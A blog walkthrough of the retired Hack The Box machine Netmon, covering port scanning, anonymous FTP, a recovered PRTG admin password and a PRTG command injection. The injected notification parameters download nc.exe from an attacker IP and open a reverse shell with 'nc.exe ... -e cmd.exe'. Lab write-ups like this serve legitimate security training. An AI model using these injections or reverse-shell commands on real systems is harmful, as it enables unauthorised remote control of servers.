---
layout: post
title: "Netmon: Hack The Box Walkthrough"
date: 2019-06-30 05:27:39 +0000
last_modified_at: 2019-06-30 07:56:06 +0000
category: Walkthrough
tags: ["Hack The Box", Netmon, retired]
comments: true
image:
  feature: netmon-htb-walkthrough.jpg
  credit: Alexas_Fotos / Pixabay
  creditlink: https://pixabay.com/photos/computer-searches-internet-chat-1172404/
---

This post documents the complete walkthrough of Netmon, a retired vulnerable [VM][1] created by [mrb3n][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post 
{:.no_toc} 

* TOC 
{:toc}

### Background

Netmon is a retired vulnerable VM from Hack The Box.

### Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.152 --rate=700

Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-03-10 13:41:15 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 49666/tcp on 10.10.10.152
Discovered open port 49664/tcp on 10.10.10.152
Discovered open port 49677/tcp on 10.10.10.152
Discovered open port 49667/tcp on 10.10.10.152
Discovered open port 49665/tcp on 10.10.10.152
Discovered open port 52337/tcp on 10.10.10.152
Discovered open port 5985/tcp on 10.10.10.152
Discovered open port 139/tcp on 10.10.10.152
Discovered open port 47001/tcp on 10.10.10.152
Discovered open port 80/tcp on 10.10.10.152
Discovered open port 445/tcp on 10.10.10.152
Discovered open port 49668/tcp on 10.10.10.152
Discovered open port 21/tcp on 10.10.10.152
Discovered open port 135/tcp on 10.10.10.152
Discovered open port 53099/tcp on 10.10.10.152
```

Whoa. `masscan` finds many open ports. Let's do one better with `nmap` scanning the discovered ports to see what services are available.

```
# nmap -n -v -Pn -p21,80,135,139,445,5985,47001,49664,49665,49666,49667,49668,49677,52337,53099 -A --reason 10.10.10.152 -oN nmap.txt
...
PORT      STATE  SERVICE      REASON          VERSION
21/tcp    open   ftp          syn-ack ttl 127 Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-03-19  12:18AM                 1024 .rnd
| 02-25-19  10:15PM       <DIR>          inetpub
| 07-16-16  09:18AM       <DIR>          PerfLogs
| 02-25-19  10:56PM       <DIR>          Program Files
| 02-03-19  12:28AM       <DIR>          Program Files (x86)
| 02-03-19  08:08AM       <DIR>          Users
|_02-25-19  11:49PM       <DIR>          Windows
| ftp-syst:
|_  SYST: Windows_NT
80/tcp    open   http         syn-ack ttl 127 Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-favicon: Unknown favicon MD5: 36B3EF286FA4BEFBB797A0966B456479
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: PRTG/18.1.37.13946
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
|_http-trane-info: Problem with XML parsing of /evox/about
135/tcp   open   msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open   netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp   open   microsoft-ds syn-ack ttl 127 Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp  open   http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
47001/tcp open   http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open   msrpc        syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open   msrpc        syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open   msrpc        syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open   msrpc        syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open   msrpc        syn-ack ttl 127 Microsoft Windows RPC
49677/tcp open   msrpc        syn-ack ttl 127 Microsoft Windows RPC
52337/tcp closed unknown      reset ttl 127
53099/tcp closed unknown      reset ttl 127
...
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2019-03-10 13:48:31
|_  start_date: 2019-03-10 13:32:38
```

Since anonymous FTP login is allowed, let's go with that first.

### File Transfer Protocol

To my pleasant surprise, `C:\Users\Public` is available.

<a class="image-popup">
![2f8bf31c.png](/assets/images/posts/netmon-htb-walkthrough/2f8bf31c.png)
</a>

And guess what, `user.txt` is here!

<a class="image-popup">
![90a90b90.png](/assets/images/posts/netmon-htb-walkthrough/90a90b90.png)
</a>

### PRTG Network Monitor

Moving on to the `http` service, this is how it looks like.

<a class="image-popup">
![542fe300.png](/assets/images/posts/netmon-htb-walkthrough/542fe300.png)
</a>

In conjunction with the official security [advisory](https://www.paessler.com/about-prtg-17-4-35-through-18-1-37) and the [location](https://kb.paessler.com/en/topic/463-how-and-where-does-prtg-store-its-data) of the various configuration files, I was able to uncover a plaintext password from the file below.

<a class="image-popup">
![adca4be4.png](/assets/images/posts/netmon-htb-walkthrough/adca4be4.png)
</a>

Here's the plaintext password.

<a class="image-popup">
![56c19c7a.png](/assets/images/posts/netmon-htb-walkthrough/56c19c7a.png)
</a>

And since this is a backup and knowing administrators increment the year for convenience's sake, the password may be `PrTg@dmin2019`. Let's give it a shot.

<a class="image-popup">
![3214f2a7.png](/assets/images/posts/netmon-htb-walkthrough/3214f2a7.png)
</a>

Awesome.

### PRTG < 18.2.39 Command Injection Vulnerability

During my research for vulnerability related to PRTG, I chanced upon this [blog](https://www.codewatch.org/blog/?p=453) discussing command injection vulnerability, with `SYSTEM` privileges no less.

Follow the instructions to create a custom notification with the following parameters.

```
test.txt; Invoke-WebRequest http://10.10.15.200/nc.exe -OutFile c:\Users\Public\Downloads\nc.exe
```

If you've read the blog carefully, you'll realize certain characters are encoded. As such, I'm avoiding certain bad characters, if you will, to download a copy of `nc.exe` to `c:\Users\Public\Downloads` with PowerShell.

Verify that `nc.exe` is indeed downloaded.

<a class="image-popup">
![e26dd675.png](/assets/images/posts/netmon-htb-walkthrough/e26dd675.png)
</a>

Next, we use the following parameters to run a reverse shell back to us.

```
test.txt; c:\Users\Public\Downloads\nc.exe 10.10.15.200 1234 -e cmd.exe
```

<a class="image-popup">
![4b13a195.png](/assets/images/posts/netmon-htb-walkthrough/4b13a195.png)
</a>

Getting `root.txt` is trivial when you have `SYSTEM` privileges.

<a class="image-popup">
![4d1f295b.png](/assets/images/posts/netmon-htb-walkthrough/4d1f295b.png)
</a>

:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/177
[2]: https://www.hackthebox.eu/home/users/profile/2984
[3]: https://www.hackthebox.eu/
